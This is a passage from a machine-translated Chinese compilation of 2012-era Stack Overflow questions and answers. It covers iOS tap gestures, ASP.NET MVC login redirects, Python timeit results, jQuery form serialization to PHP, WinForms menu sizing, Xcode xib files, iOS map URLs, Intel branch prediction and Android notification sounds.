> 赞同：1
> 
> 时间：2012-07-19T03:32:43.800

默认情况下，UIView 无法响应用户事件。

在初始化 ButtonView 后使用此代码启用其 userInteraction：

```
ButtionView.userInteractionEnabled = YES; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-02T07:16:18.860

没有改变任何重要的东西。但是想附加你的按钮操作方法将在调用 UITapGestureRecognizer 方法之后被调用。

```
ButtionView=[[UIView alloc]initWithFrame:CGRectMake(x, y, 84, 84)];
ButtionView.tag=i;
UIImageView *coverImageView = [[UIImageView alloc] initWithFrame:CGRectMake(0,0,ButtionView.frame.size.width,84)];
coverImageView.tag = i;

UIButton *notesbutton=[UIButton buttonWithType:UIButtonTypeRoundedRect];
notesbutton.frame=CGRectMake(0, 0,40,40);
notesbutton.tag=i;

[notesbutton addTarget:self action:@selector(buttonClickedForNotes:) forControlEvents:UIControlEventTouchUpInside];
[ButtionView addSubview:coverImageView];
[ButtionView addSubview:notesbutton];
[notesbutton bringSubviewToFront:ButtionView];
[self.view addSubview:ButtionView];
//[ButtionView addGestureRecognizer:oneFingerSingleTap];

UITapGestureRecognizer *singleTapGestureRecognizer = [[UITapGestureRecognizer alloc] initWithTarget:self 
                                                                                         action:@selector(singleTap:)];
singleTapGestureRecognizer.numberOfTapsRequired = 1;
singleTapGestureRecognizer.enabled = YES;
singleTapGestureRecognizer.cancelsTouchesInView = NO;
[ButtionView addGestureRecognizer:singleTapGestureRecognizer];
[singleTapGestureRecognizer release];
}

- (void)singleTap:(UITapGestureRecognizer *)gesture{
    NSLog(@"handle taps");
}

-(IBAction)buttonClickedForNotes:(id)sender{
    NSLog(@"buttion action call");
} 
```

# asp.net-mvc-3 - 在 mvc 3 中从登录重定向后发送 POST 值

> ID：11271963
> 
> 赞同：1
> 
> 时间：2012-06-30T06:20:08.043
> 
> 标签：asp.net-mvc-3, razor

**场景** 我正在尝试使用 asp.net MVC 3 在我的管理面板中构建论坛，其中只有授权用户才能更新新帖子和评论帖子。下面是我的 PostsController 的评论功能

```
 [Authorize]
        public ActionResult Comment(int id, string name, string email, string body)
        {
            Post post = GetPost(id);
            Comment comment = new Comment();
            User CurrentUser = repository.GetUser(User.Identity.Name);
            comment.UserID = CurrentUser.ID;
            comment.Post = post;
            comment.DateTime = DateTime.Now;
            comment.Name = User.Identity.Name;
            comment.Email = email;
            comment.Body = body;
            model.AddToComments(comment);
            model.SaveChanges();
            return RedirectToAction("Details", new { id = id });

        } 
```

**问题：** 如果有人在未登录的帖子上发表评论，页面将被重定向到登录页面，并且在以授权访问权限登录后，评论表单的帖子值不会被评论操作识别。评论表单的代码是：

```
 <form action="@Href("~/Posts/Comment/" + post.ID)" method ="post">
            <input type="text" id="commentNamePrompt" name="name" />
            Name (required) 
            <br />
            <input type="text" id="commentEmailPrompt" name="email" />
            Email (optional)
            <br />
            <textarea id="commentBodyInput" name="body" rows="10" cols="60"></textarea>
            <input type="submit" id="commentSubmitInput" name="submit" value="Submit!" />
            </form> 
```

**错误**

```
This property cannot be set to a null value. 
```

**尝试过：** 我尝试先登录该站点并评论帖子，它工作正常我确信错误是由于在重定向到登录页面和从登录页面后未传递模型帖子值而发生的。如何使用未经授权的用户更新的评论表单帖子值重定向到授权页面。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-01T07:21:48.070

我认为唯一的方法是将您的评论字段作为隐藏字段保存到替代登录表单中。这可以在 AuthorizeAttribute 中通过拦截未经授权的请求并使用您的评论字段重定向到另一个登录页面来完成：

```
public class CommentAuthorizeAttribute : AuthorizeAttribute
{
    protected override void HandleUnauthorizedRequest(AuthorizationContext filterContext)
    {
        var form = filterContext.RequestContext.HttpContext.Request.Form;
        var commentNamePrompt = form.Get("commentNamePrompt");
        var commentEmailPrompt = form.Get("commandEmailPrompt");
        var commentBodyInput = form.Get("commentBodyInput");
        var url = new UrlHelper(filterContext.RequestContext);
        var logonUrl = url.Action("LogonWithComment", "Account", new { commentNamePrompt, commentEmailPrompt, commentBodyInput });
        filterContext.Result = new RedirectResult(logonUrl);
    }
} 
```

评论字段可以填充到您的 LogonWithComment 视图中，并成为登录 POST 的一部分。

这不是一个很好的解决方案。如果可能的话，我会首先寻找一种避免这种情况的方法。

# python - python x=x+x 比 y=x+x 慢 120 倍？！为什么？

> ID：11271965
> 
> 赞同：2
> 
> 时间：2012-06-30T06:20:37.103
> 
> 标签：python, performance

我最近使用timeit模块对python做了一个非常简单的性能测试。结果着实让我惊呆了：消耗的时间`x=x+x`大约是**125 倍**还是为什么？`x+x`！`y=x+x,`我真的希望有人能给我一些线索，也许我用错了时间？谢谢！

请注意，`y=x+x;x=y`它和...一样慢，`x=x+x`但它和...`x=x+47`一样快`x+x`

> 测试基本操作（）
> 
> testcase="pass"，时间间隔：0.001487secs
> 
> testcase="x=47"，时间间隔：0.002424secs
> 
> testcase="x=94"，时间间隔：0.002423secs
> 
> testcase="x=47*2"，时间间隔：0.002423secs
> 
> **testcase="x+x"，时间间隔：0.003922secs**
> 
> testcase="x*2"，时间间隔：0.005307secs
> 
> **testcase="x=x+x"，时间间隔：0.497974secs**
> 
> testcase="x=x*2"，时间间隔：0.727506secs
> 
> **testcase="x=x+47"，时间间隔：0.005770secs**
> 
> testcase="x=47+x"，时间间隔：0.004442secs
> 
> **testcase="x+=x"，时间间隔：0.498920secs**
> 
> **testcase="y=x+x"，时间间隔：0.004102secs**
> 
> testcase="y=x*2"，时间间隔：0.006327secs
> 
> **测试用例="y=x+x**
> 
> **x=y"，时间间隔：0.499644 秒**
> 
> 测试用例="x+x
> 
> y=x"，时间间隔：0.004948secs
> 
> 测试用例="x+x
> 
> x=y"，时间间隔：0.005126secs
> 
> 测试用例="y=10
> 
> x=y"，时间间隔：0.003351secs
> 
> testcase="pass"，时间间隔：0.001487secs

我使用的代码：

```
import timeit
import numpy as npy
def testBasicOps():
    timeitSetup="""
x=47
y=0
"""
    testCases=['pass','x=47',\
               'x=94','x=47*2'\
               ,'x+x','x*2'\
               ,'x=x+x','x=x*2'\
               ,'x=x+47','x=47+x'\
               ,'x+=x','y=x+x'\
               ,'y=x*2','y=x+x\nx=y'\
               ,'x+x\ny=x','x+x\nx=y'\
               ,'y=10\nx=y']
    minT=[]
    tests=[]
    for i in testCases:
        tests.append(timeit.Timer(i,setup=timeitSetup))
        minT.append(npy.mean(tests[-1].repeat(10,int(1e5))))
        print 'testcase=\"%s\", time lapse:%fsecs'%(i,minT[-1])

def main():
    print "#"*10
    print "testBasicOps()"
    testBasicOps()

if __name__ == '__main__':
    main() 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-30T06:34:20.670

当你计算`x=x+x`数千次时，`x`就变得非常庞大。您正在测量添加两个非常大的数字所需的时间长度。

# php - 将序列化的 jquery 数据传递给 php，我做错了什么？

> ID：11271968
> 
> 赞同：0
> 
> 时间：2012-06-30T06:21:07.300
> 
> 标签：php, jquery, ajax, serialization

我目前有一个带有输入和名称属性的表单。

我可以通过 jquery 得到我需要的东西：

```
 var inputValues= $('.myForm').serialize(); 
```

如果我`alert(inputValues)`，我得到了我需要的东西，（比如表单 GET 变量`categories=examplevalue&name=examplename&email=exampleemail`：）

现在，我正在尝试使用 ajax 将它传递给 PHP，就像这样（**ajax.js**）

```
 $.ajax({
                url: "myfile.php",
                type: "POST",
                data: "inputs="+inputValues
            }).done(function(data){
                alert(data);
            }); 
```

在我的**PHP**中，我有这个：

```
if(isset($_POST['inputs'])){
   echo $_POST['inputs'];
} 
```

我假设它会根据我的表单提醒一堆变量，但它只会回显第一个名称变量，即`categories`

我在这里做错了什么？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T06:28:06.247

两件事情：

1.  数据分配：

    ```
    $.ajax({
            url: "myfile.php",
            type: "POST",
            data:  $('.myForm').serialize()

    }).done(function(data){
            alert(data);
    }); 
    ```

    使用输入为字段名称添加前缀。像`<input name="x"/>`变成`<input name="inputs[x]"/>`.

2.  在 php 中显示数组：

    ```
    if(isset($_POST['inputs'])){
       var_dump($_POST['inputs']);
    } 
    ```

    （`echo`只会`Array`在它不是标量值时打印）。

## 更新

如果，Lior Cohen 是对的，并且您的服务器无法识别字段名称表示法（默认 php 设置不是这种情况），那么您可以使用这个简单的解决方法：

```
parse_str(file_get_contents("php://input"), $POST); 
```

然后使用`$POST`而不是`$_POST`. 请注意，尽管这`$POST`不会是超级全球性的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-30T06:29:19.693

`serialize()`生成`foo=bar&baz=yikes`不能分配给单个参数（`inputs=...`在您的情况下）的查询字符串（）格式。

在您的`$.ajax`通话中，删除`inputs=`并`inputValues`单独使用。这将允许您使用`$_POST['myvar']`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-30T06:34:00.597

看看这个：http: [//jquery.webspirited.com/2011/02/jquery-serializepost/](http://jquery.webspirited.com/2011/02/jquery-serializepost/)

抱歉格式化，我会在电脑上修复

```
 (function($) {

        $.fn.serializePost = function() {

var data = {};

var formData = this.serializeArray();

for (var i = formData.length; i--;) {

var name = formData[i].name;

var value = formData[i].value;

var index = name.indexOf('[]');

if (index > -1) {

name = name.substring(0, index);

if (!(name in data)) {

data[name] = [];

}

data[name].push(value);

}

else

data[name] = value;

}

return data;

};

})(jQuery); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-30T06:28:26.327

看看你发送给 PHP 的内容......如果你将 'inputvalues=' 与序列化的表单连接起来，你最终会将以下内容发送给 PHP：

```
inputs=categories=examplevalue&name=examplename&email=exampleemail 
```

所以，是的……它会很混乱。:)

相反，只需在 jQuery 中执行此操作：

```
data:inputValues 
```

您需要更改帖子上的接受条件。

您还可以将数据序列化为 JSON 并对其进行反序列化，但这应该可以帮助您入门。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-30T06:28:51.250

我没有测试过这段代码，但我认为它有效

```
 var inputValues= $('.myForm').serialize();
    $.ajax({
        url: "myfile.php",
        type: "POST",
        data: inputValues,
        success: function(data){
            alert(data);
            // or use: console.log(data); /*you need firebug to log*/
        }
    }); 
```

// 和 php

```
if(isset($_POST)){
   var_dump($_POST);
} 
```

# winforms - ToolStripMenuItem.Bounds 返回不同的值，没有控制移动

> ID：11271977
> 
> 赞同：0
> 
> 时间：2012-06-30T06:23:08.173
> 
> 标签：winforms, visual-studio-2010, c#-4.0

我有一个顶部有 MenuStrip 的程序，它目前有 4 个项目。我实际上要做的是确保如果用户缩小宽度，所有这 4 个菜单项都是可见的。

我最初的尝试是通过简单地抓取项目集合然后抓取条带上最后一个项目的边界来获取 MenuStrip 上的项目总数。检索到 bounds 变量后，我会快速计算 bounds.x + bounds.width 以确保 form.width 不小于该值，如果是，它会调整大小。所有这些都发生在表单的 ResizeEnd 事件中。

```
private void F_Main_ResizeEnd(object sender, EventArgs e)
    {
        ToolStripItemCollection t_col = menuStrip1.Items;
        int _howMany = t_col.Count;
        var mi_bounds = t_col[_howMany - 1].Bounds;
        if (this.Width < (mi_bounds.X + mi_bounds.Width))
           this.Width = (mi_bounds.X + mi_bounds.Width);
    } 
```

现在，代码似乎大部分时间都可以工作。我发现如果我缩小表格，使第二个或第三个项目消失，它会调整得太薄，使第四个菜单不可见。那时，有趣的是，如果我只是单击表单的右边缘——就好像我要调整大小但不移动表单一样，它会恢复到正确的宽度并显示所有 4 个菜单项。

我发现toolstripmenuitem 的bounds 属性发生了变化，当我开始调整所有4 个显示的大小时，它的值是{a}，而当我只显示3 个时，它的值是{b}。

我现在正试图找出一种更可靠的方法来确保我的所有菜单项都是可见的，并且表单的大小会调整到适当的宽度。

抱歉，如果这不能正确解释它，因为这对我来说是一个*奇怪*的问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T06:28:34.153

*“我现在正试图找出一种更可靠的方法来确保我的所有菜单项都是可见的，并且表单的大小会调整到适当的宽度。”*

使用调整大小事件来防止表单太小是一种笨拙的方法。

**我强烈建议您设置表单最小宽度和高度属性。**

编辑：

我建议在创建菜单和/或添加新菜单后在运行时设置这些属性，然后执行以下（伪）代码：

```
ToolStripItemCollection t_col = menuStrip1.Items;
int _howMany = t_col.Count;
var mi_bounds = t_col[_howMany - 1].Bounds;
if (this.Width < (mi_bounds.X + mi_bounds.Width))
{
var minimumFormHeight = 20;
this.MinimumSize = new Size((mi_bounds.X + mi_bounds.Width), minimumFormHeight);
} 
```

# iphone - 我在 xcode 4.3.3 中的 .xib 文件在哪里

> ID：11271978
> 
> 赞同：1
> 
> 时间：2012-06-30T06:23:13.787
> 
> 标签：iphone, objective-c, xcode

我是 xcode 中的新编程人员，我正在关注一些有关为 iphone 开发程序的教程。我刚刚开始，我已经迷路了。我正在尝试使用内置的界面生成器，我的所有教程都说单击我的 <.projectname>.xib 开始编辑，但我不知道在哪里可以找到这个文件。我知道它曾经在资源文件夹中找到，但现在也不存在。请帮忙

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T06:54:07.297

如图所示此时删除勾选标记`Use StoryBoards`并创建一个项目您可以在您的项目中找到xib文件 ![在此处输入图像描述](../Images/2d5e28c14cb5075035031706f2780dc9.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T06:37:59.750

我想，你已经用故事板创建了新项目。

如果您想使用 xib，请尝试重新创建项目并取消选中“使用情节提要”标记

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T07:11:06.197

您使用的是故事板还是空应用程序？如果是这样，您将看不到 xib。选择**New Project -> Application -> SingleView Application**，您将在此处看到 .xib 文件。:)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-05-17T05:24:11.637

xib (Xcode Interface Builder) 文件用于 iOS5 之前的时代。的概念`Storyboard`是在 iOS 5 中引入的。早些时候，每个都`UIViewController`曾经与之关联`.xib`，但现在`storyboard`管理应用程序的所有视图/屏幕。（可以使用多个故事板。）

您仍然可以`.xib`通过不选择`Use Storyboards`其中一个答案中的图像所示的复选框来使用方法，但这就像在洗衣机时代用手洗衣服一样。您可能想在[这里](https://stackoverflow.com/questions/8436324/what-is-the-difference-between-a-xib-file-and-a-storyboard)阅读更多内容。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-07-22T01:42:58.507

如果您尝试解决任何连接问题并注意到您需要编辑 XIB 文件但`Use Storyboards`在创建项目时选择了该选项，只需右键单击`Main.storyboard`> 单击`Open As`> 然后单击`Source Code`。

这样您就不必从头开始重新创建项目。

[![截至 2018 年 7 月，我的屏幕截图](../Images/c816a2a20ac015b5136fe664f769b31c.png)](https://i.stack.imgur.com/XOq0F.png)

# iphone - 在 iOS 地图 URL 中提供 lat/long AND 标题似乎会导致缩放级别被忽略

> ID：11271979
> 
> 赞同：2
> 
> 时间：2012-06-30T06:23:21.973
> 
> 标签：iphone, ios, google-maps, ios4

我正在编写一个 iOS 应用程序，它会根据用户操作在地图中显示位置。我想放置一个带有描述的图钉并放大以显示地图详细信息。

如果我使用 URL [http://maps.google.com/maps?q=-33.895851,151.18483+(Some+Description)&z=19](http://maps.google.com/maps?q=-33.895851,151.18483+(Some+Description)&z=19)调用地图，我会得到一个带有“Some Description”的图钉，但缩放级别被忽略. 这*确实*适用于谷歌地图网站。

如果我使用[http://maps.google.com/maps?q=-33.895851,151.18483&z=19](http://maps.google.com/maps?q=-33.895851,151.18483&z=19)缩放工作，但我没有得到别针。

我已经尝试了 , 和 的几种组合`?q=`，`?ll=`但`?sll=`到目前为止，没有任何东西会改变缩放*和*显示描述。

有什么线索吗？

* * *

只是为了让我们*非常*清楚，这里有一些截图。我希望它可以在真实设备上运行（即使用 iOS 地图）。模拟器通过 Safari 使用谷歌地图。

这是我在 URL 1 ( `[[UIApplication sharedApplication] openURL:[NSURL URLWithString: @"http://maps.google.com/maps?q=-33.895851,151.18483+(Some+Description)&z=19"]];`)中看到的内容

![SS 1](../Images/0aee61ef506c1e0c9540b41cc5efe805.png)

这是 URL 2 ( `[[UIApplication sharedApplication] openURL:[NSURL URLWithString: @"http://maps.google.com/maps?q=-33.895851,151.18483&z=19"]];`)：

![SS 2](../Images/b4248676943c4f4c807518d3f0e374e9.png)

这是 relikd 的建议 ( `[[UIApplication sharedApplication] openURL:[NSURL URLWithString: @"http://maps.google.com/maps?z=19&q=-33.895851,151.18483+(Some+Description)"]];`)：

![在此处输入图像描述](../Images/4cae19b762b77080d6854378e7639930.png)

我想要我在屏幕截图 2 中看到的图像，但带有图钉和描述。

* * *

多亏了 phix23，它看起来`&z=`总是被忽略，我很幸运，我的示例`&z=19`恰好放大了很多。所以，我换个说法：如何“鼓励”iOS 地图放大？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-02T19:14:40.167

它看起来不受支持。在 Apple 文档中，它指出：

> q= 查询参数。该参数被视为用户在 maps.google.com 页面上的查询框中输入的。不支持 q=*

按照这一系列逻辑，您无法在搜索输入中指定缩放，因此无法使用“q=”查询字符串参数。

[http://developer.apple.com/library/ios/#featuredarticles/iPhoneURLScheme_Reference/Articles/MapLinks.html](http://developer.apple.com/library/ios/#featuredarticles/iPhoneURLScheme_Reference/Articles/MapLinks.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-06T03:12:27.880

适用于 iOS 的 Google 地图使用**光栅**图块（我认为是 .png 文件），因此它会捕捉到在屏幕上具有谨慎数量的图块的大小。谷歌这样做是为了给用户最好的图像。您将无法在两者之间放大；只有用户可以进行精确的缩放调整。

如果您需要精确的缩放级别，您将无法使用 Google 地图来显示您的地图。您需要切换到提供**矢量**图像的映射平台。 [OpenStreetMap](http://www.openstreetmap.org)是一种选择。它具有与您的 iOS 应用程序集成的现有库。例如，参见[Route-me](https://github.com/route-me/route-me)和[Cloud-Made](http://cloudmade.com)。

**（如果您对raster**与**vector**不太了解，请参阅[What's the Difference Between Raster and Vector？](http://www.psprint.com/resources/printing-tips-and-techniques/general/difference-between-raster-vector.asp)

最后，[Apple.com 上的 iOS 6 地图页面](http://www.apple.com/ios/ios6/maps/)表明新的 iOS 6 地图服务将是矢量的。如果您想为此编写代码，您应该在 developer.apple.com 上注册 iOS 开发者计划（每年 99 美元），[这样](http://developer.apple.com)您的应用程序就可以在今年秋天推出时准备就绪。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-08T12:37:30.863

我用不同的查询参数对其进行了测试，得出的结论是地图应用程序根本没有使用 z 参数。相反，只有查询字符串 (q) 用于确定合理的地图区域。示例：如果您搜索“china”，您将得到一个非常大的区域，无论 z 的值是多少，它总是相同的。

对于地理编码，带有查询字符串的 POST 请求被发送到`http://www.google.com/glm/mmap`. 它基本上返回引脚的位置和区域 + 一些元数据。

该协议是二进制的，因此最好使用官方 API 进行测试：

示例： http://maps.google.com/maps/geo?q= [-33.895851,151.18483](http://maps.google.com/maps/geo?q=-33.895851,151.18483)

这为您提供了一些带有地理编码地址的 JSON 数据，包括由指定的地图区域

```
"LatLonBox": {
    "north": -33.8944020,
    "south": -33.8971000,
    "east": 151.1860350,
    "west": 151.1833370
  } 
```

然后应用程序使用该区域来显示结果。

但是，当您在查询字符串中设置描述时，您可以获得不同的结果。我建议根本不要设置描述，因为该应用程序试图通过地理编码自行解决。

作为一种解决方法，您还可以使用 MapKit 在您自己的应用程序中显示地图。然后，您可以完全控制缩放因子和引脚注释。还可以考虑在 Safari 中打开地图，也许使用 Bing 地图而不是 google 地图。

好消息：

在 iOS 6 SDK 中有用于打开地图应用的新 API，您现在可以指定描述和地图区域：

```
CLLocationCoordinate2D coordinate = CLLocationCoordinate2DMake(-33.895851,151.18483);
MKPlacemark* p = [[MKPlacemark alloc] initWithCoordinate:coordinate addressDictionary:nil];
MKMapItem* item =  [[MKMapItem alloc] initWithPlacemark:p];
item.name = @"Some Description";
MKCoordinateSpan span = MKCoordinateSpanMake(0.05, 0.05);
[item openInMapsWithLaunchOptions:@{ MKLaunchOptionsMapSpanKey : [NSValue valueWithMKCoordinateSpan:span] }]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-06-29T07:18:00.257

一年后，我移植到 iOS 谷歌地图 API，它完全符合我的要求，没有戏剧性。我将缩放级别设置为 18，它就是这样做的。强烈推荐。

# architecture - 关于i7的分支预测

> ID：11271986
> 
> 赞同：9
> 
> 时间：2012-06-30T06:25:28.580
> 
> 标签：architecture, branch, cpu-architecture

我想知道 Intel i7 处理器的分支预测是如何工作的？

目前，我知道称为“动态分支预测”的预测器。

对于 1 位预测器：硬件总是预测分支指令采用与上次执行时相同的方向。

在实践中效果更好的改进版本是 2 位预测器。为了进一步提高预测精度，引入了2位预测方案。在这些方案中，预测必须有两次错误才会改变。

i7 是否具有与上述相同的预测器？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-30T06:44:50.227

我们对分支预测器的了解大部分来自测试。英特尔并没有公布太多细节。误预测损失约为 18 个时钟周期，因此准确的分支预测很重要。

英特尔使用两级分支预测器。内部级别被认为与 Core 2 CPU 相同。

外层更复杂，甚至可以正确预测固定计数高达 64 的循环。使用两个 18 位全局历史缓冲区。一个包含至少进行过一次的所有跳跃。另一个包含最重要的跳跃。（这些缓冲区中的条目数未知。）

请注意，间接跳转和调用有自己的预测器。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-06-30T07:26:28.327

最简洁的答案是不。

我有理由确定没有英特尔 CPU 使用您描述的一位预测器。

最初的 Pentium 使用两位描述符，就像您描述的那样。它使用的四个值通常被描述为“强烈不采用”、“弱不采用”、“弱采用”和“强烈采用”。每当一个分支被采用时，计数器就会向“强烈采用”移动一个位置。每当一个分支不被采用时，它就会向“强烈不采用”移动一个位置。这是一个饱和计数器，因此如果（例如）在计数器已经处于“强烈占用”状态时采用分支，则计数器根本不会改变。[我应该补充一点：这就是英特尔记录它的方式，并且显然打算让它发挥作用——如果没有记错的话，Agner Fog 和 Terje Mathiesen 发现它的工作方式确实有点不同——而且，通常不如这样）。

从 Pentium/MMX 和 Pentium Pro 开始，他们设计了一个更复杂的两级分支预测器。它添加了一个 4 位分支历史记录，用于选择 16 个 2 位计数器之一。这意味着，如果您有（例如）采用、采用、未采用、采用、（然后重复）的模式，它将迅速适应该模式，并正确预测所有分支。

我*不确定*i7 中分支预测的细节，但我认为可以肯定地说它至少与 Pentium Pro 一样复杂，而不是对原始 Pentium 的倒退。

# android - 使用 Jake Wharton 的 ViewPageIndicator

> ID：11271988
> 
> 赞同：0
> 
> 时间：2012-06-30T06:25:47.463
> 
> 标签：android, android-library, viewpagerindicator

我正在尝试在课堂上使用 ViewPageIndicator 库，但遇到了困难。我从 Git 下载了库，使用库代码创建了一个新的 Android 项目，但它充满了错误。我确保有 v4 和 v13 的支持库，这大大减少了错误，但 Eclipse 仍然标记了数百个错误。其中大多数是由于`@Override`这让我相信我缺少一个支持库。GitHub 页面上的安装说明非常模糊，只是提到将其作为库添加到您的项目中，仅此而已。那么我在这里缺少什么吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-30T06:32:42.120

`@Overide`只需执行以下操作即可解决错误：

1.  右键单击项目 > 属性

2.  Java 编译器 > 单击“启用项目特定设置”并将编译器级别设置为 1.6

3.  点击“应用”

# android - Uri 默认声音通知？

> ID：11271991
> 
> 赞同：126
> 
> 时间：2012-06-30T06:26:37.837
> 
> 标签：android, notifications, uri

我使用[Notification.Builder](http://developer.android.com/reference/android/app/Notification.Builder.html)来构建通知。现在我想使用默认的声音通知：

```
builder.setSound(Uri sound) 
```

但是默认通知的 Uri 在哪里？

* * *

## 回答 #1

> 赞同：279
> 
> 时间：2012-06-30T06:37:57.690

尝试使用[RingtoneManager](http://developer.android.com/reference/android/media/RingtoneManager.html)获取默认通知 Uri：

```
Uri uri= RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);

builder.setSound(uri); 
```

* * *

## 回答 #2

> 赞同：46
> 
> 时间：2013-07-23T09:07:30.853

`builder.setSound(Settings.System.DEFAULT_NOTIFICATION_URI)`也可以

* * *

## 回答 #3

> 赞同：29
> 
> 时间：2014-07-04T22:11:00.590

### 使用的两个选项`Default Notification Sound`是：

```
mBuilder.setDefaults(Notification.DEFAULT_SOUND); 
```

或使用[**RingtoneManager**](http://developer.android.com/reference/android/media/RingtoneManager.html)类：

```
mBuilder.setSound(RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)); 
```

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2015-03-25T08:25:30.380

**所有这些方法都有效**

1.  `mBuilder.setSound(RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION));`

2.  `mBuilder.setSound(Settings.System.DEFAULT_NOTIFICATION_URI);`

3.  `mBuilder.setDefaults(Notification.DEFAULT_SOUND);`

[谷歌文档](http://developer.android.com/reference/android/media/RingtoneManager.html)

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2017-08-11T11:18:50.123

对于系统默认通知

```
Uri uri= RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION); 
```

对于自定义通知

```
Uri customSoundUri = Uri.parse("android.resource://" + getPackageName() + "/" + R.raw.twirl); 
```

通知声音的来源（我重命名为“twirl”并放在 res->raw 文件夹中）

[https://notificationsounds.com/message-tones/twirl-470](https://notificationsounds.com/message-tones/twirl-470)

通知生成器：

```
NotificationCompat.Builder mBuilder =
                new NotificationCompat.Builder(this)
                        .setSmallIcon(R.drawable.notificaion_icon)
                        .setContentTitle("Title here")
                        .setContentText("Body here")
                        .setSound(defaultSoundUri)
                        .setAutoCancel(true);

NotificationManager mNotifyMgr =
                (NotificationManager) getSystemService(NOTIFICATION_SERVICE);

mNotifyMgr.notify(id, mBuilder.build()); 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2015-02-24T21:50:13.597

您也可以使用它：

```
Uri uri = Uri.parse(PreferenceManager.getDefaultSharedPreferences(this).
            getString("pref_tone", "content://settings/system/notification_sound"));
mBuilder.setSound(uri); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-03-22T13:10:10.830

如果有人仍然需要，这对声音和振动非常有效。

```
 Context context = getApplicationContext();
    long[] vibrate = new long[] { 1000, 1000, 1000, 1000, 1000 };
    Intent notificationIntent = new Intent(context, MainActivity.class);

    PendingIntent contentIntent = PendingIntent.getActivity(context,
            0, notificationIntent,
            PendingIntent.FLAG_CANCEL_CURRENT);

    Resources res = context.getResources();
    Notification.Builder builder = new Notification.Builder(context);

    builder.setContentIntent(contentIntent)
            .setSmallIcon(R.drawable.notif)
            .setTicker("lastWarning")
            .setWhen(System.currentTimeMillis())
            .setAutoCancel(true)
            .setVibrate(vibrate)
            //.setContentTitle(res.getString(R.string.notifytitle)) 
            .setContentTitle("Notification")
            .setSound(Settings.System.DEFAULT_NOTIFICATION_URI)
            //.setContentText(res.getString(R.string.notifytext))
            .setContentText("Notification text"); 

    // Notification notification = builder.getNotification(); // until API 16
    Notification notification = builder.build();

    NotificationManager notificationManager = (NotificationManager) context
            .getSystemService(Context.NOTIFICATION_SERVICE);
    notificationManager.notify(NOTIFY_ID, notification); 
```

如果您想禁用例如振动，请将振动更改为 new long[] { 0,0,0,0,0}; 您可以使用声音或使用 if else 语句做几乎类似的事情。